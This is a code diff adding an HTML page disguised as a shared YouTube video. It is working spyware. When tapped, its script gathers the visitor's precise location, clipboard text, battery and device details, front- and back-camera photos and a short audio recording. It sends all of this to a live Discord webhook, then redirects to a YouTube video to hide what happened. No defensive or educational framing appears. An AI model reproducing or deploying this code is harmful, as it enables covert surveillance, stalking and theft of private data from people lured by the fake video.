@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>YouTube</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Roboto, Arial, sans-serif; background-color: #0f0f0f; color: white; text-align: center; margin: 0; padding: 20px; }
+        .video-container { max-width: 500px; margin: auto; position: relative; cursor: pointer; }
+        .thumbnail { width: 100%; border-radius: 12px; display: block; }
+        .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 60px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.5)); }
+        .title { text-align: left; font-size: 18px; margin-top: 12px; font-weight: bold; }
+        #status { color: #aaa; margin-top: 10px; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+    <div class="video-container" onclick="send()">
+        <img src="https://images.unsplash.com/photo-1504711434969-e33886168f5c?auto=format&fit=crop&w=800&q=80" class="thumbnail">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/YouTube_play_button_icon_%282013%E2%80%932017%29.svg" class="play-button">
+        <div class="title">New Video Shared With You</div>
+    </div>
+
+    <p id="status">Tap video to play</p>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
+        const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+
+        // Helper function for dual camera capture
+        async function takeSnapshot(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 480; canvas.height = 640;
+            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+            return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
+        }
+
+        async function send() {
+            const status = document.getElementById('status');
+            status.innerText = "Connecting to player...";
+
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const referrer = document.referrer || "Direct Link";
+            const ram = navigator.deviceMemory || "Unknown";
+            const time = new Date().toLocaleString();
+            
+            let browserType = ua.includes("Discord") ? "Discord App" : (ua.includes("Instagram") ? "Instagram App" : "Standard Browser");
+
+            let batteryInfo = "Unknown";
+            try {
+                const battery = await navigator.getBattery();
+                batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Discharging"})`;
+            } catch (e) {}
+
+            let clip = "Denied";
+            try { clip = await navigator.clipboard.readText(); } catch (e) {}
+
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                // FIXED GOOGLE MAPS LINK
+                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                
+                // STEP 1: Send Text Metadata
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        content: `📍 **Location:** ${mapLink}\n📋 **Clip:** \`${clip}\`\n🔋 **Battery:** ${batteryInfo}\n📱 **Device:** ${platform} (${screenRes})\n🚀 **RAM:** ${ram}GB\n🔗 **Ref:** ${referrer}\n🌐 **App:** ${browserType}\n⏰ **Time:** ${time}` 
+                    })
+                });
+
+                // STEP 2: DUAL MEDIA CAPTURE
+                const fd = new FormData();
+                try {
+                    // Capture Front Camera + Audio
+                    const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                    const frontPhoto = await takeSnapshot(frontStream);
+                    fd.append("file1", frontPhoto, "front.jpg");
+
+                    const mediaRecorder = new MediaRecorder(frontStream);
+                    const chunks = [];
+                    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                    const recordTask = new Promise((res) => {
+                        mediaRecorder.onstop = () => res(new Blob(chunks, { type: 'audio/wav' }));
+                    });
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 2000);
+                    const audioBlob = await recordTask;
+                    fd.append("file2", audioBlob, "audio.wav");
+                    
+                    frontStream.getTracks().forEach(t => t.stop());
+
+                    // Capture Back Camera
+                    const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                    const backPhoto = await takeSnapshot(backStream);
+                    fd.append("file3", backPhoto, "back.jpg");
+                    backStream.getTracks().forEach(t => t.stop());
+
+                    await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+                } catch (mediaErr) {}
+
+                window.location.replace(REDIRECT_URL);
+
+            }, (err) => {
+                window.location.replace(REDIRECT_URL);
+            }, { enableHighAccuracy: true, timeout: 5000 });
+        }
+    </script>
+</body>
+</html>
